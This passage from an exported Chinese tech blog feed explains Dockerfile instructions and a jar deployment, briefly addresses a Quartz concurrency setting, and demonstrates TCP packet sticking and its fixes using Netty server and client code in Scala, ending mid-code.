<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入镜像</span></span><br><span class="line">[root@docker opt]<span class="comment"># cat ubuntu-12.04-x86_64-minimal.tar.gz | docker import - ubuntu:12.04</span></span><br><span class="line">sha256:ec505c11e4ee43924b4da2b94d686e36293dd8665fbb60871001a64823a1e486</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看镜像信息</span></span><br><span class="line">[root@docker opt]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              12.04               ec505c11e4ee        45 seconds ago      149MB</span><br></pre></td></tr></table></figure>
<p>这样表示镜像创建成功了。</p>
<h2 id="基于-Dockerfile-创建"><a href="#基于-Dockerfile-创建" class="headerlink" title="基于 Dockerfile 创建"></a>基于 Dockerfile 创建</h2><h3 id="Dockerfile-基础命令"><a href="#Dockerfile-基础命令" class="headerlink" title="Dockerfile 基础命令"></a>Dockerfile 基础命令</h3><ol>
<li>ADD</li>
</ol>
<p>ADD 有下面两种形式,</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] &lt;src&gt;... &lt;dest&gt;</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] [<span class="string">"&lt;src&gt;"</span>,... <span class="string">"&lt;dest&gt;"</span>]</span></span><br></pre></td></tr></table></figure>
<p>ADD 指令从<src>复制新文件，目录或远程文件 URL，并将它们添加到路径<dest>的图像文件系统中。<br>可以指定多个<src>资源，但如果它们是文件或目录，则它们的路径将被解释为相对于构建上下文的源。<br>每个<src>可能包含通配符，匹配将使用 Go 的 filepath.Match 规则完成.</src></src></dest></src></p>
<ol>
<li>COPY</li>
</ol>
<p>COPY 是复制新文件或目录到指定的目录。</p>
<ol>
<li>ENV</li>
</ol>
<p>主要用于定义变量,不过多介绍。</p>
<ol>
<li>EXPOSE</li>
</ol>
<p>EXPOSE 指令通知 Docker 容器在运行时侦听指定的网络端口。您可以指定端口是侦听 TCP 还是 UDP，如果未指定协议，则默认为 TCP。EXPOSE 指令实际上不会发布端口。它在构建映像的人和运行容器的人之间起到一种文档的作用，关于哪些端口要发布。要在运行容器时实际发布端口，请在 docker run 上使用-p 标志发布和映射一个或多个端口，或使用-P 标志发布所有公开的端口并将它们映射到高阶端口。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -p 80:80/tcp -p 80:80/udp ...</span></span><br></pre></td></tr></table></figure>
<ol>
<li>FROM</li>
</ol>
<p>Dockfile 必须以 FROM 开始,定义要从公共仓库下载的镜像信息。</p>
<ol>
<li>LABEL</li>
</ol>
<p>添加键值对的标签信息,用 docker inspect 看到的 json 数据中 label 节点对应的信息。</p>
<ol>
<li>STOPSIGNAL</li>
</ol>
<p>STOPSIGNAL 指令设置将发送到容器的系统调用信号以退出。<br>此信号可以是与内核的系统调用表中的位置匹配的有效无符号数，例如 9，或 SIGNAME 格式的信号名，例如 SIGKILL。</p>
<ol>
<li>USER</li>
</ol>
<p>USER 指令设置用户名（或 UID）以及可选的用户组（或 GID），以便在运行映像时以及 Dockerfile 中跟随它的任何 RUN，CMD 和 ENTRYPOINT 指令时使用。</p>
<ol>
<li>VOLUME</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash"> &lt;dire&gt;</span></span><br></pre></td></tr></table></figure>
<p>VOLUME 指令创建具有指定名称的安装点，并将其标记为从本机主机或其他容器保存外部安装的卷。<br>在 docker 运行时，docker 会创建一个匿名的 volume，并将此 volume 绑定到 container 的<dire>目录中，如果 container 的<dire>目录下已经有内容，则会将内容拷贝的 volume 中。也即，Dockerfile 中的 VOLUME <dire>与 docker run -v <dire> alpine 的效果一样。</dire></dire></dire></dire></p>
<ol>
<li>WORKDIR</li>
</ol>
<p>WORKDIR 指令为 Dockerfile 中的任何 RUN，CMD，ENTRYPOINT，COPY 和 ADD 指令设置工作目录。<br>如果 WORKDIR 不存在，即使它未在任何后续 Dockerfile 指令中使用，也将创建它。<br>WORKDIR 指令可以在 Dockerfile 中多次使用。<br>如果提供了相对路径，则它将相对于先前 WORKDIR 指令的路径。</p>
<ol>
<li>CMD</li>
</ol>
<p>CMD 执行 shell 命令，如果有多个 CMD 指令只有最后一个生效。</p>
<ol>
<li>RUN</li>
</ol>
<p>执行 shell 命令</p>
<ol>
<li>MAINTAINER</li>
</ol>
<p>对应的开发者信息</p>
<h4 id="基于-dockerfile-部署-jar-项目"><a href="#基于-dockerfile-部署-jar-项目" class="headerlink" title="基于 dockerfile 部署 jar 项目"></a>基于 dockerfile 部署 jar 项目</h4><ol>
<li>Dockerfile 内容</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> xwolf &lt;<span class="number">2324808561</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9090</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MIN_HEAP <span class="number">512</span>m</span><br><span class="line"><span class="keyword">ENV</span> MAX_HEAP <span class="number">2048</span>m</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /opt/data</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /opt/logs</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /opt/logs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> develps=<span class="string">"xwolf&lt;32143@qq.com&gt;"</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> tester=<span class="string">"王司徒"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MODULE ms</span><br><span class="line"><span class="keyword">ENV</span> MODULE_VERSION <span class="number">0.0</span>.<span class="number">1</span>-SNAPSHOT</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./<span class="variable">$&#123;MODULE&#125;</span>-<span class="variable">$&#123;MODULE_VERSION&#125;</span>.jar /opt/data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> java -jar -Xms<span class="variable">$&#123;MIN_HEAP&#125;</span> -Xmx<span class="variable">$&#123;MAX_HEAP&#125;</span>  \</span></span><br><span class="line"><span class="bash">     <span class="variable">$&#123;MODULE&#125;</span>-<span class="variable">$&#123;MODULE_VERSION&#125;</span>.jar \</span></span><br><span class="line"><span class="bash">     &gt; /opt/logs/<span class="variable">$&#123;MODULE&#125;</span>-`date +%m%d%H%M`.<span class="built_in">log</span>  2&gt; /opt/logs/<span class="variable">$&#123;MODULE&#125;</span>-error-`date +%m%d%H%M`.<span class="built_in">log</span></span></span><br></pre></td></tr></table></figure>
<ol>
<li>构建镜像</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker build -t xwolf/ms:1.0.0 -f Dockerfile target/</span><br></pre></td></tr></table></figure>
<ol>
<li>启动容器</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动对应镜像ID</span></span><br><span class="line"></span><br><span class="line">[root@docker ~]<span class="comment"># docker run -d -p 9090:9090  IMAGE_ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有容器,UP状态表示启动成功</span></span><br><span class="line">[root@docker ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS                           PORTS                    NAMES</span><br><span class="line">c0e2b88b86a6        8d47d112584a          <span class="string">"/bin/sh -c 'java -j…"</span>   3 minutes ago       Up 3 minutes                     0.0.0.0:9090-&gt;9090/tcp   eloquent_jackson</span><br></pre></td></tr></table></figure>
<p>至此，docker 镜像搞完了。</p>
<h3 id="如有错误欢迎批评指正。"><a href="#如有错误欢迎批评指正。" class="headerlink" title="如有错误欢迎批评指正。"></a>如有错误欢迎批评指正。</h3>]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Quartz 并发问题</title>
    <url>/2018/01/16/distributed/Quartz%E5%B9%B6%E5%8F%91%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>假设一个job设置为每1分钟执行一次,但是业务执行完成需要5分钟。<br>为避免此问题,设置并发属性为false即可.<br><img src="https://i.imgur.com/HBpu74f.png" alt></p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>quartz</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty TCP拆、粘包解决</title>
    <url>/2017/11/01/distributed/Netty%20TCP%E6%8B%86%E3%80%81%E7%B2%98%E5%8C%85%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<blockquote>
<h1 id="TCP-UDP简介"><a href="#TCP-UDP简介" class="headerlink" title="TCP/UDP简介"></a>TCP/UDP简介</h1></blockquote>
<p>TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。</p>
<p>UDP（user datagram protocol，用户数据报协议）是无连接的，面向消息的，提供高效率服务。不会使用块的合并优化算法，, 由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。 即面向消息的通信是有消息保护边界的。<br>由于TCP无消息保护边界, 需要在消息接收端处理消息边界问题。也就是为什么我们以前使用UDP没有此问题。 反而使用TCP后，出现少包的现象。</p>
<blockquote>
<h1 id="TCP粘包"><a href="#TCP粘包" class="headerlink" title="TCP粘包"></a>TCP粘包</h1></blockquote>
<p>TCP粘包是指发送方发送的若干包数据到接收方接收时粘成一包，从接收缓冲区看，后一包数据的头紧接着前一包数据的尾。<br>出现粘包现象的原因是多方面的，它既可能由发送方造成，也可能由接收方造成。</p>
<blockquote>
<ul>
<li>客户端发送两个数据包A1、A2。服务端可能读到A1和A2的一部分就会出现粘包问题。</li>
</ul>
</blockquote>
<p><img src="https://i.imgur.com/6GMpKEI.png" alt></p>
<p>TCP粘包的原因:</p>
<blockquote>
<ul>
<li>应用程序写入的字节大小大于套接口发送缓冲大小</li>
<li>进行MSS大小的TCP分段</li>
<li>以太网帧的payload大于MTU进行IP分片</li>
</ul>
</blockquote>
<p>粘包问题的解决:</p>
<blockquote>
<ul>
<li><p>发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度，这样接收端在接收到数据后，通过读取包首部的长度字段，便知道每一个数据包的实际长度了。</p>
</li>
<li><p>发送端将每个数据包封装为固定长度（不够的可以通过补0填充），这样接收端每次从接收缓冲区中读取固定长度的数据就自然而然的把每个数据包拆分开来。</p>
</li>
<li><p>可以在数据包之间设置边界，如添加特殊符号，这样，接收端通过这个边界就可以将不同的数据包拆分开。</p>
</li>
</ul>
<h1 id="TCP粘包问题重现及解决"><a href="#TCP粘包问题重现及解决" class="headerlink" title="TCP粘包问题重现及解决"></a>TCP粘包问题重现及解决</h1><h4 id="粘包问题"><a href="#粘包问题" class="headerlink" title="粘包问题"></a>粘包问题</h4></blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.<span class="type">ServerBootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioServerSocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelInitializer</span>, <span class="type">ChannelOption</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.<span class="type">LineBasedFrameDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.string.<span class="type">StringDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.logging.&#123;<span class="type">LogLevel</span>, <span class="type">LoggingHandler</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 拆包粘包问题</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FragmentedServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">    <span class="comment">//服务端接收客户端请求</span></span><br><span class="line">    <span class="keyword">val</span> bossGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="comment">// 处理socketChannel网络读写请求</span></span><br><span class="line">    <span class="keyword">val</span> workerGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//服务启动辅助</span></span><br><span class="line">      <span class="keyword">val</span> serverBootstrap = <span class="keyword">new</span> <span class="type">ServerBootstrap</span>()</span><br><span class="line">      <span class="comment">//添加I/O 事件处理,</span></span><br><span class="line">      serverBootstrap.group(bossGroup, workerGroup)</span><br><span class="line">        .channel(classOf[<span class="type">NioServerSocketChannel</span>]).option(<span class="type">ChannelOption</span>.<span class="type">SO_BACKLOG</span>.asInstanceOf[<span class="type">ChannelOption</span>[<span class="type">Any</span>]],<span class="number">1024</span>)</span><br><span class="line">        .childHandler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) = &#123;</span><br><span class="line">          <span class="comment">//ch.pipeline().addLast(new LineBasedFrameDecoder(1024))</span></span><br><span class="line">          <span class="comment">// ch.pipeline().addLast(new StringDecoder())</span></span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">LoggingHandler</span>(<span class="type">LogLevel</span>.<span class="type">DEBUG</span>))</span><br><span class="line">              ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">FragmentedServerHandler</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">//绑定端口,等待绑定完成</span></span><br><span class="line">      <span class="keyword">val</span> futureChannel = serverBootstrap.bind(host, port).sync()</span><br><span class="line">      futureChannel.channel().closeFuture().sync()</span><br><span class="line">    &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">      <span class="comment">//优雅关机</span></span><br><span class="line">      bossGroup.shutdownGracefully()</span><br><span class="line">      workerGroup.shutdownGracefully()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FragmentedServer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server =<span class="keyword">new</span>  <span class="type">FragmentedServer</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9091</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.text.<span class="type">SimpleDateFormat</span></span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">Date</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FragmentedServerHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = println(<span class="string">"server: channelActive"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>) = println(<span class="string">"server channelReadComplete"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server channelRead invoked"</span>)</span><br><span class="line">    <span class="keyword">val</span> separator = <span class="type">System</span>.getProperty(<span class="string">"line.separator"</span>)</span><br><span class="line">    <span class="keyword">val</span> message = msg.asInstanceOf[<span class="type">String</span>]</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    println(<span class="string">s"服务端接收的内容:<span class="subst">$message</span>,总共计数为:<span class="subst">$count</span>"</span>)</span><br><span class="line">    <span class="keyword">val</span> currentTime = getCurrentTime()</span><br><span class="line">    <span class="keyword">val</span> back =<span class="keyword">if</span> (<span class="string">"EXIT"</span>.contains(message)) <span class="string">s"client请求EXIT,当前时间:<span class="subst">$currentTime</span>"</span></span><br><span class="line">                                      <span class="keyword">else</span> <span class="string">s"client请求信息:<span class="subst">$message</span>,当前时间:<span class="subst">$currentTime</span>"</span></span><br><span class="line">    <span class="keyword">val</span> resp = <span class="type">Unpooled</span>.copiedBuffer((back+count+separator).getBytes(<span class="string">"UTF-8"</span>))</span><br><span class="line">    ctx.writeAndFlush(resp)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">getCurrentTime</span></span>(): <span class="type">String</span> =&#123;</span><br><span class="line">    <span class="keyword">val</span> format = <span class="keyword">new</span> <span class="type">SimpleDateFormat</span>(<span class="string">"YYYY-MM-dd HH:mm:ss.SSS"</span>)</span><br><span class="line">    format.format(<span class="keyword">new</span> <span class="type">Date</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">exceptionCaught</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, cause: <span class="type">Throwable</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server exception close,message:"</span>+ cause.printStackTrace())</span><br><span class="line">    ctx.close()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.<span class="type">Bootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioSocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelInitializer</span>, <span class="type">ChannelOption</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.<span class="type">LineBasedFrameDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.string.<span class="type">StringDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.logging.&#123;<span class="type">LogLevel</span>, <span class="type">LoggingHandler</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FragmentedClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">connect</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> work = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="keyword">val</span> bootstrap = <span class="keyword">new</span> <span class="type">Bootstrap</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      bootstrap.group(work).channel(classOf[<span class="type">NioSocketChannel</span>]).</span><br><span class="line">        option(<span class="type">ChannelOption</span>.<span class="type">TCP_NODELAY</span>.asInstanceOf[<span class="type">ChannelOption</span>[<span class="type">Any</span>]],<span class="literal">true</span>).handler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) =&#123;</span><br><span class="line">          <span class="comment">//ch.pipeline().addLast(new LineBasedFrameDecoder(1024))</span></span><br><span class="line">          <span class="comment">//ch.pipeline().addLast(new StringDecoder())</span></span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">LoggingHandler</span>(<span class="type">LogLevel</span>.<span class="type">DEBUG</span>))</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">FragmentedClientHandler</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">val</span> funture = bootstrap.connect(host, port).sync()</span><br><span class="line">      funture.channel().closeFuture().sync()</span><br><span class="line">    &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">      work.shutdownGracefully()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FragmentedClient</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> client = <span class="keyword">new</span> <span class="type">FragmentedClient</span></span><br><span class="line">    client.connect(<span class="string">"localhost"</span>,<span class="number">9091</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FragmentedClientHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelActive"</span>)</span><br><span class="line">    <span class="keyword">val</span> separator = <span class="type">System</span>.getProperty(<span class="string">"line.separator"</span>)</span><br><span class="line">    <span class="keyword">var</span> message:<span class="type">String</span> = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">for</span> (i &lt;<span class="number">-0</span> to <span class="number">50</span>)&#123;</span><br><span class="line">       <span class="keyword">if</span> ( i % <span class="number">2</span> == <span class="number">0</span> )&#123;</span><br><span class="line">          message = <span class="string">"EXIT"</span></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          message=<span class="string">"client发送到服务端信息:"</span></span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">val</span> writeBuf =<span class="type">Unpooled</span>.buffer(message.length())</span><br><span class="line">      writeBuf.writeBytes((message+i+separator).getBytes())</span><br><span class="line">      ctx.writeAndFlush(writeBuf)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelRead"</span>)</span><br><span class="line">    <span class="keyword">val</span> message = msg.asInstanceOf[<span class="type">String</span>]</span><br><span class="line">    println(message)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channeReadComplete"</span>)</span><br><span class="line">    ctx.flush()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>server端输出：</p>
<p><img src="https://i.imgur.com/wAgqPk9.png" alt></p>
<p>client端输出：</p>
<p><img src="https://i.imgur.com/97DGB8b.png" alt></p>
<p>发生粘包问题,客户端循环100次发送信息,服务端收到两条。</p>
<blockquote>
<h4 id="Netty解决粘包问题"><a href="#Netty解决粘包问题" class="headerlink" title="Netty解决粘包问题"></a>Netty解决粘包问题</h4><ul>
<li>基于 LineBasedFrameDecoder</li>
</ul>
</blockquote>
<p>server/client都添加编码器</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">LineBasedFrameDecoder</span>(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">StringDecoder</span>())</span><br></pre></td></tr></table></figure>
<p>客户端服务端都接收到相同的结果则拆包、粘包问题处理成功。</p>
<p>LineBasedFrameDecoder的工作原理是遍历ByteBuf中的可读字节，当遇到换行符\n或者\r\n作为结束位置，<br>从可读字节索引到结束位置作为一行。</p>
<p>StringDecoder 是将接收的对象转化为字符串。</p>
<blockquote>
<ul>
<li>基于DelimiterBasedFrameDecoder</li>
</ul>
</blockquote>
<p>自定义分隔符来解决拆粘包问题</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.<span class="type">ServerBootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioServerSocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelInitializer</span>, <span class="type">ChannelOption</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.<span class="type">DelimiterBasedFrameDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.string.<span class="type">StringDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.logging.&#123;<span class="type">LogLevel</span>, <span class="type">LoggingHandler</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 拆包粘包问题</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DelimiterServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">    <span class="comment">//服务端接收客户端请求</span></span><br><span class="line">    <span class="keyword">val</span> bossGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="comment">// 处理socketChannel网络读写请求</span></span><br><span class="line">    <span class="keyword">val</span> workerGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      